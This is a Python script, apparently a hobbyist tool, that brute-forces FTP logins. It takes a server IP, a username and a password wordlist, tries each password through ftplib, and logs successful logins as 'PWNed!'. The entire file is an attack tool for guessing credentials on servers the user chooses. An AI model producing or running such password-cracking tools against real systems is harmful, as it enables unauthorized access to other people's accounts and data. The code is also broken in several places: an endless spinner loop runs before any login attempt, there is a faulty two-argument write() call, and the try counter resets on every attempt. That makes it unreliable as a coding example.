#! /usr/bin/python3

import ftplib
import os
import datetime
import time
import cowsay

# constants
CWD = os.getcwd()
FTPLOG = os.path.join(CWD, 'ftp_bruteforce.log')
LOGHEADER = '''

*****************************************************
*** FTP Bruteforcer logfile' -- Successful logins ***
*****************************************************

'''
isfound = False

# spinning timer
def spin(found=False):
    """Prints spinning timer bar(s), with ARG 'bars' #bars.
    Stops when ARG 'found' (global 'isfound') evaluates to True.
    Default: 10 bars + autostop if NO ARGS given"""
    global isfound

    while True:
        spinner = "\\|/-"

        print("----------\r", end='', flush=True)

        for pos in range(10):
            print("-", end='', flush=True)
            for spin in range(25):
                # break statement here when task completed
                found = isfound
                if found:
                    print()
                    break
                time.sleep(0.1)
                print("\b" + spinner[spin % 4], end='', flush=True)
            print("\b*", end='', flush=True)

# vars (modify for sys.argv instead/additionally!)
server = input("Enter IP-Address of FTP server: ")
print(server)

user = input("Enter username to brute-force: ")
print(user)

passwd_list = input("Please provide path and filename of passwordlist: ")
print(passwd_list)

starttime = time.time()
spin(isfound)
print(f'*** Starting cracking process... ***\n')



try:
    with open(passwd_list, 'r') as passwords:
        for password in passwords:
            password = password.strip()
            try:
                tries = 0
                ftp_con  = ftplib.FTP(server, user, password)
                if ftp_con:
                    print(f'''[+] Success! Connected to FTP server {server} with user {user}\
                    and password {password} -- try #{tries})''')

                    endtime = time.time()
                    delta_time = endtime - starttime
                    print(f'[…] Elapsed Time: {delta_time} seconds')

                    CURRENT_TIME = datetime.datetime.now()
                    LOGLINE = f'[+] PWNed! server: {server} with username: {user}\
                    and password {password} (try #{tries} @ {CURRENT_TIME}\n'

                    tries += 1

                    if os.path.exists(FTPLOG):
                        with open(FTPLOG, 'a+' ) as ftp_log:
                            ftp_log.write(LOGLINE)
                    else:
                        with open(FTPLOG, 'w+') as ftp_log:
                            ftp_log.write(LOGHEADER, LOGLINE)
            except:
                print(f'still trying... *** password: {password} *** try #{tries}\r', end='')

except FileNotFoundError:
    print(f'[-] Sorry. Your password list could not be found at {passwd_list}!')
finally:
    cowsay.trex("SOMETHING WENT REALLY WRONG HERE...")

# -> Refactor as script with Commandline ARGS and functions incl. main()

# Run as script with ARGS IF ARGS exist AND script NOT imported as module

# if __name__ == '__main__':
#     # if there are ARGS ...
#     if len(sys.argv) > 1:
#         args = [print(f"{x}, ", end='') for x in sys.argv[1:]]
#         main(args)  # run script with ARGS
#     else:
#         main()  # else run without ARGS (default ARGS)
